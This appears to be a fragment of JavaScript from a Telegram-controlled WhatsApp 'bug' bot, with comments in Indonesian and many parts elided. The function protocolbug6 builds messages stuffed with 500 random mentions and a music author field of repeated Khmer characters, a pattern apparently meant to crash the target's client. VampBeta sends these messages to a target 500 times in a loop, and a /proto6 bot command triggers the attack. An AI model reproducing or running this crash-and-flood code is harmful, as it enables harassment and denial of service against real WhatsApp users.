...
async function protocolbug6(target, mention) {
  ...
  const mentionedList = [
    ...
    ...Array.from({ length: 500 }, () => 1${Math.floor(Math.random() * 500000)}@s.whatsapp.net) // batasi jumlah untuk mencegah crash
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".RaldzzXyz" + "ោ៝".repeat(1000),
    title: "PhynixAgency",
...
async function VampBeta(target) {
    for (let i = 0; i <= 500; i++) {
    await protocolbug6(target, Ptcp = true)
    }
...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    ...
    for (let i = 0; i < 200; i++) { // Kirim 3 kali langsung
...
bot.onText(/\/proto6(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
